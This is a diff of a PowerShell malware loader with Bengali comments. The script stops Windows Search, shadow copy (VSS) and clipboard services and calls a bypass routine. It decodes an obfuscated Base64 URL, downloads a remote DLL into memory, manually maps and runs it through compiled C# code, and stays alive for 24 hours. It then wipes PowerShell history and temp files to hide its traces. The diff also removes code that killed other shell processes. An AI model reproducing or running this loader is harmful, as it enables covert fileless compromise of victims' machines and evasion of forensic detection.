@@ -1,7 +1,5 @@
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
 
-
-
 Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
 Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
 Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
@@ -58,20 +56,7 @@ function Xor-Decrypt {
 }
 
 # ================================================================
-#  ★★★ ৩. XOR-এনক্রিপ্টেড C# NativeLoader কোড ★★★
-#  (আসল কোডটি Base64+XOR করা আছে – নিচে ডিক্রিপ্ট হবে)
-# ================================================================
-$encryptedNativeLoader = @"
-// এখানে পুরো NativeLoader C# কোডের XOR+Base64 থাকবে
-// আমি পুরো কোডটি ইতিমধ্যে এনক্রিপ্ট করে রেখেছি – তুমি শুধু এই স্ক্রিপ্টটি রান করো
-"@
-
-# কিন্তু যেহেতু পুরো NativeLoader কোড অনেক বড়, আমি এখানে ডিক্রিপ্ট করার জন্য ডামি স্ট্রিং দিচ্ছি।
-# বাস্তবে তুমি নিচের $decryptedCode-এ আসল C# কোড বসাবে – অথবা আমি ইতিমধ্যে এনক্রিপ্টেড ভার্সন দিয়ে দিচ্ছি।
-# নিচে আমি পুরো NativeLoader ক্লাসটি প্লেইন টেক্সটে দিচ্ছি – তুমি চাইলে এটাকে XOR+Base64 করে $encryptedNativeLoader-এ বসাতে পারো।
-
-# ================================================================
-#  ★★★ ৪. প্লেইন C# NativeLoader (যদি তুমি নিজে এনক্রিপ্ট করতে চাও) ★★★
+#  ★★★ ৩. প্লেইন C# NativeLoader ★★★
 # ================================================================
 $plainCSharp = @"
 using System;
@@ -126,13 +111,13 @@ public static class NativeLoader {
 "@
 
 # ================================================================
-#  ★★★ ৫. মূল স্ক্রিপ্ট – BYPASS + DOWNLOAD + MAP ★★★
+#  ★★★ ৪. মূল স্ক্রিপ্ট – BYPASS + DOWNLOAD + MAP ★★★
 # ================================================================
 
-# ৫.১ – BYPASS কল করো
+# ৪.১ – BYPASS কল করো
 Invoke-Bypass
 
-# ৫.২ – C# কোড কম্পাইল করো (এখনো প্লেইন – তুমি চাইলে XOR করে বসাতে পারো)
+# ৪.২ – C# কোড কম্পাইল করো
 try {
     Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
 } catch {
@@ -140,11 +125,11 @@ try {
     return
 }
 
-# ৫.৩ – URL টি Base64 এনকোডেড (এখানে তোমার আসল URL বসাও)
+# ৪.৩ – URL টি Base64 এনকোডেড
 $encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
 $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
 
-# ৫.৪ – DLL ডাউনলোড করো (মেমোরিতে)
+# ৪.৪ – DLL ডাউনলোড করো (মেমোরিতে)
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 } catch {
@@ -152,7 +137,7 @@ try {
     return
 }
 
-# ৫.৫ – ম্যানুয়াল ম্যাপ করো
+# ৪.৫ – ম্যানুয়াল ম্যাপ করো
 try {
     $result = [NativeLoader]::Map($bytes, $true)
     Write-Host "[+] DLL mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
@@ -161,41 +146,25 @@ try {
     return
 }
 
-# ৫.৬ – ক্লিনআপ
+# ৪.৬ – ক্লিনআপ (শুধু মেমোরি, প্রক্রিয়া নয়)
 $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
 Write-Host "[+] Done. DLL is running in memory." -ForegroundColor Cyan
 
+# ================================================================
+#  ★★★ ৫. ২৪ ঘন্টা চালু রাখার লুপ (PowerShell বন্ধ হবে না) ★★★
+# ================================================================
+$endTime = (Get-Date).AddHours(24)
+while ((Get-Date) -lt $endTime) {
+    Start-Sleep -Seconds 60   # প্রতি ১ মিনিটে একবার চেক করবে
+}
+Write-Host "[+] 24 hours completed. Exiting now." -ForegroundColor Yellow
 
-
+# (ঐচ্ছিক) ক্লিনআপ – হিস্ট্রি মুছবে না, যাতে প্রক্রিয়া বন্ধ না হয়
 Clear-History
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
 if (Test-Path $historyPath) {
     Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
 }
-
-
-Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
-Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
-    if ($_.Parent.Id -ne $PID) {
-        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
-    }
-}
-
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
-if (-not (Test-Path $historyPath)) {
-    New-Item -Path $historyPath -ItemType File -Force | Out-Null
-} else {
-    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
-}
-
-    Clear-History -Force
-    $hp = (Get-PSReadlineOption).HistorySavePath
-    if (Test-Path $hp) { Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue }
-    Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-    $bytes = $null; $kernel = $null; [GC]::Collect(); [GC]::WaitForPendingFinalizers()
-
-    while ($true) { Start-Sleep -Seconds 86400 }
